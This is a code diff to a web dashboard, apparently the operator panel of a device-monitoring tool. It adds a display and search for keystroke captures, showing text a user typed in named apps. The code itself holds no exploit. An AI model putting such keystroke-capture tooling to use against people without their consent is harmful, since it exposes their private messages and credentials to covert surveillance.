@@ -735,6 +735,12 @@ function formatFileSize(bytes) {
 function buildActivityDetail(a) {
     const fields = [];
 
+    // Highlighted typed-text block for keystroke captures
+    let typedHtml = '';
+    if (a.activity_type === 'text_input' && a.data && a.data.text) {
+        typedHtml = `<div style="margin:0 0 10px;padding:8px 12px;background:#f4f6fb;border-left:3px solid #5b7cfa;border-radius:4px;color:#333;font-size:13px;white-space:pre-wrap;word-break:break-word;">“${escHtml(String(a.data.text).substring(0, 500))}”</div>`;
+    }
+
     // Always-present fields
     fields.push({ label: 'Activity Type', value: escHtml(a.activity_type || '—') });
     fields.push({ label: 'App Name',      value: escHtml(a.app_name || '—') });
@@ -762,7 +768,7 @@ function buildActivityDetail(a) {
         rawHtml = `<div class="activity-data-raw">${escHtml(JSON.stringify(data, null, 2))}</div>`;
     }
 
-    return `<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
+    return `${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
 }
 
 function formatFullTime(ts) {
@@ -776,7 +782,7 @@ function formatFullTime(ts) {
 
 function renderActivityPanel() {
     const container = document.getElementById('panel-activity');
-    const items = filterList(cachedActivity, [a => a.app_name, a => a.package_name, a => a.activity_type]);
+    const items = filterList(cachedActivity, [a => a.app_name, a => a.package_name, a => a.activity_type, a => a.data && a.data.text]);
     if (items.length === 0) {
         container.innerHTML = `<div class="empty-state"><div class="empty-icon">📋</div>${currentSearchQuery ? 'No matching activity logs' : 'No activity recorded yet'}</div>`;
         return;
@@ -787,7 +793,7 @@ function renderActivityPanel() {
                 <span class="activity-arrow" id="act-arrow-${idx}">▶</span>
                 <div class="activity-app-icon">${activityIcon(a)}</div>
                 <div class="activity-main">
-                    <div class="activity-name">${escHtml(a.app_name || a.activity_type || 'Activity')}</div>
+                    <div class="activity-name">${escHtml(a.activity_type === 'text_input' ? ('⌨ Typed in ' + (a.app_name || a.package_name || 'App')) : (a.app_name || a.activity_type || 'Activity'))}</div>
                     ${a.package_name ? `<div class="activity-pkg">${escHtml(a.package_name)}</div>` : ''}
                 </div>
                 <span class="activity-time">${formatTime(a.timestamp)}</span>
